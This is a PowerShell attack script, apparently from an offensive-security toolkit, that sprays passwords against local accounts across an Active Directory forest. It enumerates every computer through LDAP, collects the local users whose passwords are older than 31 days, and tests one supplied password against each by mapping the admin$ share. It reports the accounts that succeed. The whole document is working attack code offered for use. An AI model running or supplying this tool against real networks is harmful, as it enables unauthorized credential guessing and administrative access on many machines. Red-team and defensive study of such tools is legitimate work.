<#
    Author: Itamar Mizrahi (@MrAnde7son)
    License: GNU v3
    Required Dependencies: None
    Optional Dependencies: None
#>

function Invoke-LocalUserSprayAttack
{
<#
    .SYNOPSIS
        Search all local user accounts within the forest whose password age is above 31 days, and validate against a given password.

        Author: Itamar Mizrahi (@MrAnde7son)
        License: GNU v3
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

    .PARAMETER Password
    Password to use.

    .EXAMPLE 
        PS C:\> Invoke-LocalUserSprayAttack
        Returns users that were validated successfully

#>
    [CmdletBinding()]
    Param (
        [String]
        $Password = '*'
    )

    $net = New-Object -ComObject WScript.Network
    $Users = @()
    $AllComputers= @()
    $objForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($objForest.Domains)
    $Domains = $DomainList | foreach { $_.name }
    foreach ($Domain in $Domains)
    {
        $strFilter = "(objectCategory=Computer)"
        $objDomain = New-Object System.DirectoryServices.DirectoryEntry
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objSearcher.SearchRoot = $objDomain
        $objSearcher.PageSize = 200
        $objSearcher.Filter = $strFilter
        $objSearcher.SearchScope = "Subtree"
        $objSearcher.PropertiesToLoad.Add("Name") | Out-Null
        $colResults = $objSearcher.FindAll()
        foreach ($objResult in $colResults)
        {
            $AllComputers += $objResult.Properties.Item("Name")
        }
    }

    foreach ($computer in $AllComputers){
        $UserObjects = ([adsi]"WinNT://$computer,Computer").Children | ? {$_.SchemaClassName -eq "User" -and $_.PasswordAge -gt 2678400 } | select Path,PasswordAge
        foreach ($user in $UserObjects){
            $object = New-Object psobject
            $object | Add-Member -MemberType NoteProperty -Name "Path" -Value $user.Path
            $object | Add-Member -MemberType NoteProperty -Name "PasswordAge" -Value $user.PasswordAge
            $Users += $object
        }
    }


    foreach ($user in $Users){
        $comp = $user.Path.Split("/")[3]
        $login = $user.Path.Split("/")[3] + "\" + $user.Path.Split("/")[4]
        try {
            $result = $net.MapNetworkDrive("u:", "\\$comp\admin$", $false, $login, $Password)
        }
        catch {}
        if($result -eq 0){
            $net.RemoveNetworkDrive("u:",$true,$true)
            $user
        }
    }

}